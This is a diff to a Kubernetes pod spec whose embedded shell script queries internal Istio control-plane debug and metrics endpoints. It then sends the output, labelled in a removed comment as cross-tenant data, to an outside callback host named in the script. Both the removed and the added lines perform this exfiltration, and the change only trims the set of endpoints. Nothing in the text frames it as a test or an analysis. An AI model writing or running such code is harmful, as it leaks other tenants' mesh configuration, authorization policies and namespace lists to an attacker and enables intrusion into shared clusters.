@@ -26,31 +26,11 @@ spec:
       - |
         CB="https://www.masonhck.tech/ssrf.php"
         ISTIOD="istiod.istio-system.svc.cluster.local"
-        
-        # 1. Istio debug endpoints (port 8080) - cross-tenant data
-        for ep in endpointz configz registryz authorizationz meshconfig adsz; do
-          DATA=$(curl -s --connect-timeout 5 "http://${ISTIOD}:8080/debug/${ep}" 2>&1 | head -c 3000)
-          LEN=${#DATA}
-          # Send first 2KB via callback
-          echo "$DATA" | head -c 2000 | curl -s "${CB}?src=v42-istio-${ep}&len=${LEN}" --data-urlencode "d@-" > /dev/null
+        for ep in endpointz configz registryz authorizationz; do
+          D=$(curl -s --connect-timeout 5 "http://${ISTIOD}:8080/debug/${ep}" 2>&1 | head -c 2000)
+          echo "$D" | curl -s "${CB}?src=v42-${ep}&len=${#D}" --data-urlencode "d@-" > /dev/null
         done
-        
-        # 2. Istio xDS port (plaintext gRPC discovery)
-        XDS=$(curl -s --connect-timeout 5 "http://${ISTIOD}:15010/debug/endpointz" 2>&1 | head -c 2000)
-        echo "$XDS" | curl -s "${CB}?src=v42-xds" --data-urlencode "d@-" > /dev/null
-        
-        # 3. Istio metrics - extract namespace/service names
-        METRICS=$(curl -s --connect-timeout 5 "http://${ISTIOD}:15014/metrics" 2>&1)
-        # Extract unique namespace references
-        NS_LIST=$(echo "$METRICS" | grep -oP 'namespace="[^"]*"' | sort -u | head -20)
-        echo "$NS_LIST" | curl -s "${CB}?src=v42-ns-list" --data-urlencode "d@-" > /dev/null
-        
-        # Extract service names
-        SVC_LIST=$(echo "$METRICS" | grep -oP 'name="[^"]*"' | sort -u | head -30)
-        echo "$SVC_LIST" | curl -s "${CB}?src=v42-svc-list" --data-urlencode "d@-" > /dev/null
-        
-        # 4. Count of namespaces and total metrics size
-        NS_COUNT=$(echo "$METRICS" | grep -oP 'namespace="[^"]*"' | sort -u | wc -l)
-        echo "NS=${NS_COUNT} METRICS=${#METRICS}" | curl -s "${CB}?src=v42-summary" --data-urlencode "d@-" > /dev/null
-        
-        echo "V42 NS=${NS_COUNT} MLEN=${#METRICS} DONE"
+        M=$(curl -s --connect-timeout 5 "http://${ISTIOD}:15014/metrics" 2>&1)
+        NS=$(echo "$M" | grep -oP 'namespace="[^"]*"' | sort -u)
+        echo "$NS" | curl -s "${CB}?src=v42-namespaces" --data-urlencode "d@-" > /dev/null
+        echo "V42 NS=$(echo "$NS" | wc -l) DONE"
